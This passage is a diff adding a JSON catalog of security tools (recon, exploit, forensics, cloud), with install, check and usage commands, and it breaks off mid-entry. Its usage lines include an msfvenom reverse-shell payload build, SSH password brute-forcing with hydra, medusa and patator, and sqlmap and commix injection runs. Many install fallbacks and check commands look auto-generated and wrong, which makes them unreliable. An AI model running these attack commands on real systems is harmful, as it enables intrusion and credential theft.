@@ -1,0 +1,1212 @@
+{
+  "tools": [
+    {
+      "name": "angr",
+      "description": "Imported from HexStrike catalog: Angr.",
+      "category": "binary",
+      "install_command": "sudo apt update && (sudo apt install -y angr || python3 -m pip install angr)",
+      "check_command": "command -v angr >/dev/null 2>&1",
+      "usage": "angr <target>"
+    },
+    {
+      "name": "binary_analysis",
+      "description": "Imported from HexStrike catalog: Binary Analysis.",
+      "category": "binary",
+      "install_command": "sudo apt update && (sudo apt install -y checksec || python3 -m pip install binary-analysis)",
+      "check_command": "command -v checksec >/dev/null 2>&1 || command -v binary_analysis >/dev/null 2>&1 || command -v binary-analysis >/dev/null 2>&1",
+      "usage": "checksec <target>"
+    },
+    {
+      "name": "binwalk",
+      "description": "Imported from HexStrike catalog: Binwalk.",
+      "category": "binary",
+      "install_command": "sudo apt update && sudo apt install -y binwalk",
+      "check_command": "command -v binwalk >/dev/null 2>&1",
+      "usage": "binwalk firmware.bin"
+    },
+    {
+      "name": "checksec",
+      "description": "Imported from HexStrike catalog: Checksec.",
+      "category": "binary",
+      "install_command": "sudo apt update && (sudo apt install -y checksec || python3 -m pip install checksec)",
+      "check_command": "command -v checksec >/dev/null 2>&1",
+      "usage": "checksec <target>"
+    },
+    {
+      "name": "gdb",
+      "description": "Imported from HexStrike catalog: Gdb.",
+      "category": "binary",
+      "install_command": "sudo apt update && (sudo apt install -y gdb || python3 -m pip install gdb)",
+      "check_command": "command -v gdb >/dev/null 2>&1",
+      "usage": "gdb <target>"
+    },
+    {
+      "name": "gdb-peda",
+      "description": "Imported from HexStrike catalog: Gdb Peda.",
+      "category": "binary",
+      "install_command": "sudo apt update && (sudo apt install -y gdb || python3 -m pip install gdb-peda)",
+      "check_command": "command -v gdb >/dev/null 2>&1 || command -v gdb-peda >/dev/null 2>&1 || command -v gdb_peda >/dev/null 2>&1",
+      "usage": "gdb <target>"
+    },
+    {
+      "name": "ghidra",
+      "description": "Imported from HexStrike catalog: Ghidra.",
+      "category": "binary",
+      "install_command": "echo 'Install ghidra manually from official release'",
+      "check_command": "command -v ghidra >/dev/null 2>&1",
+      "usage": "ghidra <target>"
+    },
+    {
+      "name": "libc-database",
+      "description": "Imported from HexStrike catalog: Libc Database.",
+      "category": "binary",
+      "install_command": "sudo apt update && (sudo apt install -y libc-database || python3 -m pip install libc-database)",
+      "check_command": "command -v libc-database >/dev/null 2>&1 || command -v libc_database >/dev/null 2>&1",
+      "usage": "libc-database <target>"
+    },
+    {
+      "name": "objdump",
+      "description": "Imported from HexStrike catalog: Objdump.",
+      "category": "binary",
+      "install_command": "sudo apt update && (sudo apt install -y objdump || python3 -m pip install objdump)",
+      "check_command": "command -v objdump >/dev/null 2>&1",
+      "usage": "objdump <target>"
+    },
+    {
+      "name": "one-gadget",
+      "description": "Imported from HexStrike catalog: One Gadget.",
+      "category": "binary",
+      "install_command": "sudo apt update && (sudo apt install -y one-gadget || python3 -m pip install one-gadget)",
+      "check_command": "command -v one_gadget >/dev/null 2>&1 || command -v one-gadget >/dev/null 2>&1",
+      "usage": "one_gadget <target>"
+    },
+    {
+      "name": "radare2",
+      "description": "Imported from HexStrike catalog: Radare2.",
+      "category": "binary",
+      "install_command": "sudo apt update && sudo apt install -y radare2",
+      "check_command": "command -v radare2 >/dev/null 2>&1",
+      "usage": "radare2 <binary>"
+    },
+    {
+      "name": "ropgadget",
+      "description": "Imported from HexStrike catalog: Ropgadget.",
+      "category": "binary",
+      "install_command": "python3 -m pip install ROPGadget",
+      "check_command": "command -v ropgadget >/dev/null 2>&1",
+      "usage": "ROPgadget --binary <binary>"
+    },
+    {
+      "name": "ropper",
+      "description": "Imported from HexStrike catalog: Ropper.",
+      "category": "binary",
+      "install_command": "python3 -m pip install ropper",
+      "check_command": "command -v ropper >/dev/null 2>&1",
+      "usage": "ropper --file <binary>"
+    },
+    {
+      "name": "strings",
+      "description": "Imported from HexStrike catalog: Strings.",
+      "category": "binary",
+      "install_command": "sudo apt update && (sudo apt install -y strings || python3 -m pip install strings)",
+      "check_command": "command -v strings >/dev/null 2>&1",
+      "usage": "strings <target>"
+    },
+    {
+      "name": "xxd",
+      "description": "Imported from HexStrike catalog: Xxd.",
+      "category": "binary",
+      "install_command": "sudo apt update && (sudo apt install -y xxd || python3 -m pip install xxd)",
+      "check_command": "command -v xxd >/dev/null 2>&1",
+      "usage": "xxd <target>"
+    },
+    {
+      "name": "checkov",
+      "description": "Imported from HexStrike catalog: Checkov.",
+      "category": "cloud",
+      "install_command": "sudo apt update && (sudo apt install -y checkov || python3 -m pip install checkov)",
+      "check_command": "command -v checkov >/dev/null 2>&1",
+      "usage": "checkov --help"
+    },
+    {
+      "name": "clair",
+      "description": "Imported from HexStrike catalog: Clair.",
+      "category": "cloud",
+      "install_command": "sudo apt update && (sudo apt install -y clair || python3 -m pip install clair)",
+      "check_command": "command -v clair >/dev/null 2>&1",
+      "usage": "clair --help"
+    },
+    {
+      "name": "docker-bench-security",
+      "description": "Imported from HexStrike catalog: Docker Bench Security.",
+      "category": "cloud",
+      "install_command": "sudo apt update && (sudo apt install -y docker-bench-security.sh || python3 -m pip install docker-bench-security)",
+      "check_command": "command -v docker-bench-security.sh >/dev/null 2>&1 || command -v docker-bench-security >/dev/null 2>&1 || command -v docker_bench_security >/dev/null 2>&1",
+      "usage": "docker-bench-security.sh --help"
+    },
+    {
+      "name": "kube-bench",
+      "description": "Imported from HexStrike catalog: Kube Bench.",
+      "category": "cloud",
+      "install_command": "sudo apt update && (sudo apt install -y kube-bench || python3 -m pip install kube-bench)",
+      "check_command": "command -v kube-bench >/dev/null 2>&1 || command -v kube_bench >/dev/null 2>&1",
+      "usage": "kube-bench --help"
+    },
+    {
+      "name": "kube-hunter",
+      "description": "Imported from HexStrike catalog: Kube Hunter.",
+      "category": "cloud",
+      "install_command": "sudo apt update && (sudo apt install -y kube-hunter || python3 -m pip install kube-hunter)",
+      "check_command": "command -v kube-hunter >/dev/null 2>&1 || command -v kube_hunter >/dev/null 2>&1",
+      "usage": "kube-hunter --help"
+    },
+    {
+      "name": "prowler",
+      "description": "Imported from HexStrike catalog: Prowler.",
+      "category": "cloud",
+      "install_command": "sudo apt update && (sudo apt install -y prowler || python3 -m pip install prowler)",
+      "check_command": "command -v prowler >/dev/null 2>&1",
+      "usage": "prowler --help"
+    },
+    {
+      "name": "scout-suite",
+      "description": "Imported from HexStrike catalog: Scout Suite.",
+      "category": "cloud",
+      "install_command": "sudo apt update && (sudo apt install -y scout || python3 -m pip install scout-suite)",
+      "check_command": "command -v scout >/dev/null 2>&1 || command -v scout-suite >/dev/null 2>&1 || command -v scout_suite >/dev/null 2>&1",
+      "usage": "scout --help"
+    },
+    {
+      "name": "terrascan",
+      "description": "Imported from HexStrike catalog: Terrascan.",
+      "category": "cloud",
+      "install_command": "sudo apt update && sudo apt install -y terrascan",
+      "check_command": "command -v terrascan >/dev/null 2>&1",
+      "usage": "terrascan scan -i terraform"
+    },
+    {
+      "name": "trivy",
+      "description": "Imported from HexStrike catalog: Trivy.",
+      "category": "cloud",
+      "install_command": "sudo apt update && sudo apt install -y trivy",
+      "check_command": "command -v trivy >/dev/null 2>&1",
+      "usage": "trivy image alpine:latest"
+    },
+    {
+      "name": "cloudmapper",
+      "description": "Imported from HexStrike catalog: Cloudmapper.",
+      "category": "exploit",
+      "install_command": "sudo apt update && (sudo apt install -y cloudmapper || python3 -m pip install cloudmapper)",
+      "check_command": "command -v cloudmapper >/dev/null 2>&1",
+      "usage": "cloudmapper <target>"
+    },
+    {
+      "name": "commix",
+      "description": "Automated command injection detection and exploitation framework.",
+      "category": "exploit",
+      "install_command": "sudo apt update && (sudo apt install -y commix || python3 -m pip install commix)",
+      "check_command": "command -v commix >/dev/null 2>&1",
+      "usage": "commix --url https://<target_host>/index.php?id=1 --batch --level=1"
+    },
+    {
+      "name": "exploit_framework",
+      "description": "Imported from HexStrike catalog: Exploit Framework.",
+      "category": "exploit",
+      "install_command": "sudo apt update && (sudo apt install -y msfconsole || python3 -m pip install exploit-framework)",
+      "check_command": "command -v msfconsole >/dev/null 2>&1 || command -v exploit_framework >/dev/null 2>&1 || command -v exploit-framework >/dev/null 2>&1",
+      "usage": "msfconsole <target>"
+    },
+    {
+      "name": "hashcat",
+      "description": "GPU-accelerated hash cracking utility.",
+      "category": "exploit",
+      "install_command": "sudo apt update && sudo apt install -y hashcat",
+      "check_command": "hashcat --version",
+      "usage": "hashcat -m 0 -a 0 <hash_file> rockyou.txt"
+    },
+    {
+      "name": "hashpump",
+      "description": "Imported from HexStrike catalog: Hashpump.",
+      "category": "exploit",
+      "install_command": "sudo apt update && (sudo apt install -y hashpump || python3 -m pip install hashpump)",
+      "check_command": "command -v hashpump >/dev/null 2>&1",
+      "usage": "hashpump <target>"
+    },
+    {
+      "name": "hydra",
+      "description": "Online password brute-force utility.",
+      "category": "exploit",
+      "install_command": "sudo apt update && sudo apt install -y hydra",
+      "check_command": "hydra -h",
+      "usage": "hydra -L users.txt -P passwords.txt ssh://<target>"
+    },
+    {
+      "name": "impacket",
+      "description": "Imported from HexStrike catalog: Impacket.",
+      "category": "exploit",
+      "install_command": "sudo apt update && (sudo apt install -y impacket || python3 -m pip install impacket)",
+      "check_command": "command -v impacket >/dev/null 2>&1",
+      "usage": "impacket <target>"
+    },
+    {
+      "name": "john",
+      "description": "Password hash cracking (John the Ripper).",
+      "category": "exploit",
+      "install_command": "sudo apt update && sudo apt install -y john",
+      "check_command": "john --version",
+      "usage": "john --wordlist=rockyou.txt <hash_file>"
+    },
+    {
+      "name": "medusa",
+      "description": "Imported from HexStrike catalog: Medusa.",
+      "category": "exploit",
+      "install_command": "sudo apt update && sudo apt install -y medusa",
+      "check_command": "command -v medusa >/dev/null 2>&1",
+      "usage": "medusa -h <target> -u admin -P passwords.txt -M ssh"
+    },
+    {
+      "name": "metasploit",
+      "description": "Imported from HexStrike catalog: Metasploit.",
+      "category": "exploit",
+      "install_command": "sudo apt update && sudo apt install -y metasploit-framework",
+      "check_command": "command -v metasploit >/dev/null 2>&1",
+      "usage": "msfconsole -q"
+    },
+    {
+      "name": "msfvenom",
+      "description": "Imported from HexStrike catalog: Msfvenom.",
+      "category": "exploit",
+      "install_command": "sudo apt update && sudo apt install -y metasploit-framework",
+      "check_command": "command -v msfvenom >/dev/null 2>&1",
+      "usage": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f elf"
+    },
+    {
+      "name": "pacu",
+      "description": "Imported from HexStrike catalog: Pacu.",
+      "category": "exploit",
+      "install_command": "sudo apt update && (sudo apt install -y pacu || python3 -m pip install pacu)",
+      "check_command": "command -v pacu >/dev/null 2>&1",
+      "usage": "pacu <target>"
+    },
+    {
+      "name": "password-cracking",
+      "description": "Imported from HexStrike catalog: Password Cracking.",
+      "category": "exploit",
+      "install_command": "sudo apt update && (sudo apt install -y hashcat || python3 -m pip install password-cracking)",
+      "check_command": "command -v hashcat >/dev/null 2>&1 || command -v password-cracking >/dev/null 2>&1 || command -v password_cracking >/dev/null 2>&1",
+      "usage": "hashcat <target>"
+    },
+    {
+      "name": "password_cracking",
+      "description": "Imported from HexStrike catalog: Password Cracking.",
+      "category": "exploit",
+      "install_command": "sudo apt update && (sudo apt install -y hashcat || python3 -m pip install password-cracking)",
+      "check_command": "command -v hashcat >/dev/null 2>&1 || command -v password_cracking >/dev/null 2>&1 || command -v password-cracking >/dev/null 2>&1",
+      "usage": "hashcat <target>"
+    },
+    {
+      "name": "patator",
+      "description": "Imported from HexStrike catalog: Patator.",
+      "category": "exploit",
+      "install_command": "sudo apt update && sudo apt install -y patator",
+      "check_command": "command -v patator >/dev/null 2>&1",
+      "usage": "patator ssh_login host=<target> user=admin password=FILE0 0=passwords.txt"
+    },
+    {
+      "name": "pwninit",
+      "description": "Imported from HexStrike catalog: Pwninit.",
+      "category": "exploit",
+      "install_command": "sudo apt update && (sudo apt install -y pwninit || python3 -m pip install pwninit)",
+      "check_command": "command -v pwninit >/dev/null 2>&1",
+      "usage": "pwninit <target>"
+    },
+    {
+      "name": "pwntools",
+      "description": "Imported from HexStrike catalog: Pwntools.",
+      "category": "exploit",
+      "install_command": "sudo apt update && (sudo apt install -y pwntools || python3 -m pip install pwntools)",
+      "check_command": "command -v pwntools >/dev/null 2>&1",
+      "usage": "pwntools <target>"
+    },
+    {
+      "name": "responder",
+      "description": "Imported from HexStrike catalog: Responder.",
+      "category": "exploit",
+      "install_command": "sudo apt update && sudo apt install -y responder",
+      "check_command": "command -v responder >/dev/null 2>&1",
+      "usage": "responder -I eth0"
+    },
+    {
+      "name": "sqlmap",
+      "description": "Automatic SQL injection detection and exploitation.",
+      "category": "exploit",
+      "install_command": "sudo apt update && sudo apt install -y sqlmap",
+      "check_command": "sqlmap --version",
+      "usage": "sqlmap -u 'https://<target>/item.php?id=1' --batch"
+    },
+    {
+      "name": "vulnx",
+      "description": "Vulnerability intelligence and CVE-oriented web checks.",
+      "category": "exploit",
+      "install_command": "python3 -m pip install vulnx",
+      "check_command": "command -v vulnx >/dev/null 2>&1",
+      "usage": "vulnx -u https://<target_host> --timeout 15"
+    },
+    {
+      "name": "exiftool",
+      "description": "Imported from HexStrike catalog: Exiftool.",
+      "category": "forensics",
+      "install_command": "sudo apt update && sudo apt install -y libimage-exiftool-perl",
+      "check_command": "command -v exiftool >/dev/null 2>&1",
+      "usage": "exiftool sample.jpg"
+    },
+    {
+      "name": "foremost",
+      "description": "Imported from HexStrike catalog: Foremost.",
+      "category": "forensics",
+      "install_command": "sudo apt update && (sudo apt install -y foremost || python3 -m pip install foremost)",
+      "check_command": "command -v foremost >/dev/null 2>&1",
+      "usage": "foremost <target>"
+    },
+    {
+      "name": "steghide",
+      "description": "Imported from HexStrike catalog: Steghide.",
+      "category": "forensics",
+      "install_command": "sudo apt update && (sudo apt install -y steghide || python3 -m pip install steghide)",
+      "check_command": "command -v steghide >/dev/null 2>&1",
+      "usage": "steghide <target>"
+    },
+    {
+      "name": "volatility",
+      "description": "Imported from HexStrike catalog: Volatility.",
+      "category": "forensics",
+      "install_command": "python3 -m pip install volatility",
+      "check_command": "command -v volatility >/dev/null 2>&1",
+      "usage": "vol.py -f memory.dump imageinfo"
+    },
+    {
+      "name": "volatility3",
+      "description": "Imported from HexStrike catalog: Volatility3.",
+      "category": "forensics",
+      "install_command": "python3 -m pip install volatility3",
+      "check_command": "command -v volatility3 >/dev/null 2>&1",
+      "usage": "vol -f memory.dump windows.info"
+    },
+    {
+      "name": "anew",
+      "description": "Imported from HexStrike catalog: Anew.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y anew || python3 -m pip install anew)",
+      "check_command": "command -v anew >/dev/null 2>&1",
+      "usage": "anew --help"
+    },
+    {
+      "name": "auto-install-missing-apt",
+      "description": "Imported from HexStrike catalog: Auto Install Missing Apt.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y apt || python3 -m pip install auto-install-missing-apt)",
+      "check_command": "command -v apt >/dev/null 2>&1 || command -v auto-install-missing-apt >/dev/null 2>&1 || command -v auto_install_missing_apt >/dev/null 2>&1",
+      "usage": "apt --help"
+    },
+    {
+      "name": "bulk_extractor",
+      "description": "Imported from HexStrike catalog: Bulk Extractor.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y bulk-extractor || python3 -m pip install bulk-extractor)",
+      "check_command": "command -v bulk_extractor >/dev/null 2>&1 || command -v bulk-extractor >/dev/null 2>&1",
+      "usage": "bulk_extractor --help"
+    },
+    {
+      "name": "censys",
+      "description": "Imported from HexStrike catalog: Censys.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y censys || python3 -m pip install censys)",
+      "check_command": "command -v censys >/dev/null 2>&1",
+      "usage": "censys --help"
+    },
+    {
+      "name": "evil_winrm",
+      "description": "Imported from HexStrike catalog: Evil Winrm.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y evil-winrm || python3 -m pip install evil-winrm)",
+      "check_command": "command -v evil_winrm >/dev/null 2>&1 || command -v evil-winrm >/dev/null 2>&1",
+      "usage": "evil_winrm --help"
+    },
+    {
+      "name": "falco",
+      "description": "Imported from HexStrike catalog: Falco.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y falco || python3 -m pip install falco)",
+      "check_command": "command -v falco >/dev/null 2>&1",
+      "usage": "falco --help"
+    },
+    {
+      "name": "file_type",
+      "description": "Imported from HexStrike catalog: File Type.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y file-type || python3 -m pip install file-type)",
+      "check_command": "command -v file_type >/dev/null 2>&1 || command -v file-type >/dev/null 2>&1",
+      "usage": "file_type --help"
+    },
+    {
+      "name": "hibp",
+      "description": "Imported from HexStrike catalog: Hibp.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y hibp || python3 -m pip install hibp)",
+      "check_command": "command -v hibp >/dev/null 2>&1",
+      "usage": "hibp --help"
+    },
+    {
+      "name": "kismet",
+      "description": "Imported from HexStrike catalog: Kismet.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y kismet || python3 -m pip install kismet)",
+      "check_command": "command -v kismet >/dev/null 2>&1",
+      "usage": "kismet --help"
+    },
+    {
+      "name": "maltego",
+      "description": "Imported from HexStrike catalog: Maltego.",
+      "category": "misc",
+      "install_command": "echo 'Install maltego manually from official website'",
+      "check_command": "command -v maltego >/dev/null 2>&1",
+      "usage": "maltego --help"
+    },
+    {
+      "name": "mysql",
+      "description": "Imported from HexStrike catalog: Mysql.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y mysql || python3 -m pip install mysql)",
+      "check_command": "command -v mysql >/dev/null 2>&1",
+      "usage": "mysql --help"
+    },
+    {
+      "name": "mytool",
+      "description": "Imported from HexStrike catalog: Mytool.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y mytool || python3 -m pip install mytool)",
+      "check_command": "command -v mytool >/dev/null 2>&1",
+      "usage": "mytool --help"
+    },
+    {
+      "name": "outguess",
+      "description": "Imported from HexStrike catalog: Outguess.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y outguess || python3 -m pip install outguess)",
+      "check_command": "command -v outguess >/dev/null 2>&1",
+      "usage": "outguess --help"
+    },
+    {
+      "name": "photorec",
+      "description": "Imported from HexStrike catalog: Photorec.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y photorec || python3 -m pip install photorec)",
+      "check_command": "command -v photorec >/dev/null 2>&1",
+      "usage": "photorec --help"
+    },
+    {
+      "name": "postgresql",
+      "description": "Imported from HexStrike catalog: Postgresql.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y postgresql || python3 -m pip install postgresql)",
+      "check_command": "command -v postgresql >/dev/null 2>&1",
+      "usage": "postgresql --help"
+    },
+    {
+      "name": "recon_ng",
+      "description": "Imported from HexStrike catalog: Recon Ng.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y recon-ng || python3 -m pip install recon-ng)",
+      "check_command": "command -v recon-ng >/dev/null 2>&1 || command -v recon_ng >/dev/null 2>&1",
+      "usage": "recon-ng --help"
+    },
+    {
+      "name": "scalpel",
+      "description": "Imported from HexStrike catalog: Scalpel.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y scalpel || python3 -m pip install scalpel)",
+      "check_command": "command -v scalpel >/dev/null 2>&1",
+      "usage": "scalpel --help"
+    },
+    {
+      "name": "sherlock",
+      "description": "Imported from HexStrike catalog: Sherlock.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y sherlock || python3 -m pip install sherlock)",
+      "check_command": "command -v sherlock >/dev/null 2>&1",
+      "usage": "sherlock --help"
+    },
+    {
+      "name": "shodan",
+      "description": "Imported from HexStrike catalog: Shodan.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y shodan || python3 -m pip install shodan)",
+      "check_command": "command -v shodan >/dev/null 2>&1",
+      "usage": "shodan --help"
+    },
+    {
+      "name": "sleuthkit",
+      "description": "Imported from HexStrike catalog: Sleuthkit.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y sleuthkit || python3 -m pip install sleuthkit)",
+      "check_command": "command -v sleuthkit >/dev/null 2>&1",
+      "usage": "sleuthkit --help"
+    },
+    {
+      "name": "social_analyzer",
+      "description": "Imported from HexStrike catalog: Social Analyzer.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y social-analyzer || python3 -m pip install social-analyzer)",
+      "check_command": "command -v social_analyzer >/dev/null 2>&1 || command -v social-analyzer >/dev/null 2>&1",
+      "usage": "social_analyzer --help"
+    },
+    {
+      "name": "spiderfoot",
+      "description": "Imported from HexStrike catalog: Spiderfoot.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y spiderfoot || python3 -m pip install spiderfoot)",
+      "check_command": "command -v spiderfoot >/dev/null 2>&1",
+      "usage": "spiderfoot --help"
+    },
+    {
+      "name": "sqlite",
+      "description": "Imported from HexStrike catalog: Sqlite.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y sqlite3 || python3 -m pip install sqlite)",
+      "check_command": "command -v sqlite3 >/dev/null 2>&1 || command -v sqlite >/dev/null 2>&1",
+      "usage": "sqlite3 --help"
+    },
+    {
+      "name": "sqlite3",
+      "description": "Imported from HexStrike catalog: Sqlite3.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y sqlite3 || python3 -m pip install sqlite3)",
+      "check_command": "command -v sqlite3 >/dev/null 2>&1",
+      "usage": "sqlite3 --help"
+    },
+    {
+      "name": "stegsolve",
+      "description": "Imported from HexStrike catalog: Stegsolve.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y stegsolve || python3 -m pip install stegsolve)",
+      "check_command": "command -v stegsolve >/dev/null 2>&1",
+      "usage": "stegsolve --help"
+    },
+    {
+      "name": "tcpdump",
+      "description": "Imported from HexStrike catalog: Tcpdump.",
+      "category": "misc",
+      "install_command": "sudo apt update && sudo apt install -y tcpdump",
+      "check_command": "command -v tcpdump >/dev/null 2>&1",
+      "usage": "tcpdump -i any host <target>"
+    },
+    {
+      "name": "testdisk",
+      "description": "Imported from HexStrike catalog: Testdisk.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y testdisk || python3 -m pip install testdisk)",
+      "check_command": "command -v testdisk >/dev/null 2>&1",
+      "usage": "testdisk --help"
+    },
+    {
+      "name": "tshark",
+      "description": "Imported from HexStrike catalog: Tshark.",
+      "category": "misc",
+      "install_command": "sudo apt update && sudo apt install -y tshark",
+      "check_command": "command -v tshark >/dev/null 2>&1",
+      "usage": "tshark -i any -f \"host <target>\""
+    },
+    {
+      "name": "wireshark",
+      "description": "Imported from HexStrike catalog: Wireshark.",
+      "category": "misc",
+      "install_command": "sudo apt update && sudo apt install -y wireshark",
+      "check_command": "command -v wireshark >/dev/null 2>&1",
+      "usage": "wireshark"
+    },
+    {
+      "name": "zsteg",
+      "description": "Imported from HexStrike catalog: Zsteg.",
+      "category": "misc",
+      "install_command": "sudo apt update && (sudo apt install -y zsteg || python3 -m pip install zsteg)",
+      "check_command": "command -v zsteg >/dev/null 2>&1",
+      "usage": "zsteg --help"
+    },
+    {
+      "name": "amass",
+      "description": "Attack surface mapping and subdomain enumeration.",
+      "category": "recon",
+      "install_command": "sudo apt update && sudo apt install -y amass",
+      "check_command": "amass -version",
+      "usage": "amass enum -d <domain>"
+    },
+    {
+      "name": "arp-scan",
+      "description": "Imported from HexStrike catalog: Arp Scan.",
+      "category": "recon",
+      "install_command": "sudo apt update && (sudo apt install -y arp-scan || python3 -m pip install arp-scan)",
+      "check_command": "command -v arp-scan >/dev/null 2>&1 || command -v arp_scan >/dev/null 2>&1",
+      "usage": "arp-scan <target>"
+    },
+    {
+      "name": "assetfinder",
+      "description": "Passive subdomain discovery from public sources.",
+      "category": "recon",
+      "install_command": "go install github.com/tomnomnom/assetfinder@latest",
+      "check_command": "assetfinder -h",
+      "usage": "assetfinder --subs-only <target>"
+    },
+    {
+      "name": "autorecon",
+      "description": "Imported from HexStrike catalog: Autorecon.",
+      "category": "recon",
+      "install_command": "sudo apt update && (sudo apt install -y autorecon || python3 -m pip install autorecon)",
+      "check_command": "command -v autorecon >/dev/null 2>&1",
+      "usage": "autorecon <target>"
+    },
+    {
+      "name": "dnsenum",
+      "description": "DNS record and subdomain enumeration.",
+      "category": "recon",
+      "install_command": "sudo apt update && sudo apt install -y dnsenum",
+      "check_command": "dnsenum --help",
+      "usage": "dnsenum <domain>"
+    },
+    {
+      "name": "dnsx",
+      "description": "DNS toolkit for resolving and probing subdomains.",
+      "category": "recon",
+      "install_command": "go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest",
+      "check_command": "dnsx -version",
+      "usage": "dnsx -d <target>"
+    },
+    {
+      "name": "enum4linux",
+      "description": "SMB and Windows enum helper.",
+      "category": "recon",
+      "install_command": "sudo apt update && sudo apt install -y enum4linux",
+      "check_command": "enum4linux -h",
+      "usage": "enum4linux -a <target>"
+    },
+    {
+      "name": "enum4linux-ng",
+      "description": "Imported from HexStrike catalog: Enum4Linux Ng.",
+      "category": "recon",
+      "install_command": "python3 -m pip install enum4linux-ng",
+      "check_command": "command -v enum4linux-ng >/dev/null 2>&1 || command -v enum4linux_ng >/dev/null 2>&1",
+      "usage": "enum4linux-ng -A <target>"
+    },
+    {
+      "name": "fierce",
+      "description": "Imported from HexStrike catalog: Fierce.",
+      "category": "recon",
+      "install_command": "sudo apt update && sudo apt install -y fierce",
+      "check_command": "command -v fierce >/dev/null 2>&1",
+      "usage": "fierce --domain <domain>"
+    },
+    {
+      "name": "gau",
+      "description": "Get historical URLs from public archives.",
+      "category": "recon",
+      "install_command": "sudo apt update && sudo apt install -y gau",
+      "check_command": "gau --version",
+      "usage": "gau <domain>"
+    },
+    {
+      "name": "httpx",
+      "description": "HTTP probing, status checks, and technology detection.",
+      "category": "recon",
+      "install_command": "sudo apt update && sudo apt install -y httpx-toolkit",
+      "check_command": "httpx -version",
+      "usage": "httpx -u https://<target> -title -status-code -tech-detect"
+    },
+    {
+      "name": "ldapdomaindump",
+      "description": "Active Directory LDAP domain dump and relationship mapping.",
+      "category": "recon",
+      "install_command": "python3 -m pip install ldapdomaindump",
+      "check_command": "command -v ldapdomaindump >/dev/null 2>&1",
+      "usage": "ldapdomaindump ldap://<target_host> -u <user> -p <password> --no-html"
+    },
+    {
+      "name": "masscan",
+      "description": "High-speed TCP port scanning.",
+      "category": "recon",
+      "install_command": "sudo apt update && sudo apt install -y masscan",
+      "check_command": "masscan --version",
+      "usage": "sudo masscan <target> -p1-1000 --rate 1000"
+    },
+    {
+      "name": "naabu",
+      "description": "Fast port scanner for internet recon.",
+      "category": "recon",
+      "install_command": "go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest",
+      "check_command": "naabu -version",
+      "usage": "naabu -host <target> -top-ports 1000"
+    },
+    {
+      "name": "nbtscan",
+      "description": "Imported from HexStrike catalog: Nbtscan.",
+      "category": "recon",
+      "install_command": "sudo apt update && sudo apt install -y nbtscan",
+      "check_command": "command -v nbtscan >/dev/null 2>&1",
+      "usage": "nbtscan <target>"
+    },
+    {
+      "name": "netexec",
+      "description": "Imported from HexStrike catalog: Netexec.",
+      "category": "recon",
+      "install_command": "sudo apt update && (sudo apt install -y netexec || python3 -m pip install netexec)",
+      "check_command": "command -v netexec >/dev/null 2>&1",
+      "usage": "netexec <target>"
+    },
+    {
+      "name": "nmap",
+      "description": "Network discovery and service/port scanning.",
+      "category": "recon",
+      "install_command": "sudo apt update && sudo apt install -y nmap",
+      "check_command": "nmap --version",
+      "usage": "nmap -sV -Pn <target>"
+    },
+    {
+      "name": "nmap-advanced",
+      "description": "Imported from HexStrike catalog: Nmap Advanced.",
+      "category": "recon",
+      "install_command": "sudo apt update && (sudo apt install -y nmap || python3 -m pip install nmap-advanced)",
+      "check_command": "command -v nmap >/dev/null 2>&1 || command -v nmap-advanced >/dev/null 2>&1 || command -v nmap_advanced >/dev/null 2>&1",
+      "usage": "nmap <target>"
+    },
+    {
+      "name": "recon",
+      "description": "Imported from HexStrike catalog: Recon.",
+      "category": "recon",
+      "install_command": "sudo apt update && (sudo apt install -y subfinder || python3 -m pip install recon)",
+      "check_command": "command -v subfinder >/dev/null 2>&1 || command -v recon >/dev/null 2>&1",
+      "usage": "subfinder <target>"
+    },
+    {
+      "name": "rpcclient",
+      "description": "Imported from HexStrike catalog: Rpcclient.",
+      "category": "recon",
+      "install_command": "sudo apt update && sudo apt install -y samba-common-bin",
+      "check_command": "command -v rpcclient >/dev/null 2>&1",
+      "usage": "rpcclient -U \"\" -N <target>"
+    },
+    {
+      "name": "rustscan",
+      "description": "Imported from HexStrike catalog: Rustscan.",
+      "category": "recon",
+      "install_command": "sudo apt update && sudo apt install -y rustscan",
+      "check_command": "command -v rustscan >/dev/null 2>&1",
+      "usage": "rustscan -a <target>"
+    },
+    {
+      "name": "smbmap",
+      "description": "Imported from HexStrike catalog: Smbmap.",
+      "category": "recon",
+      "install_command": "sudo apt update && sudo apt install -y smbmap",
+      "check_command": "command -v smbmap >/dev/null 2>&1",
+      "usage": "smbmap -H <target>"
+    },
+    {
+      "name": "subfinder",
+      "description": "Passive subdomain discovery.",
+      "category": "recon",
+      "install_command": "sudo apt update && sudo apt install -y subfinder",
+      "check_command": "subfinder -version",
+      "usage": "subfinder -d <domain>"
+    },
+    {
+      "name": "sublist3r",
+      "description": "OSINT subdomain enumeration with search engine sources.",
+      "category": "recon",
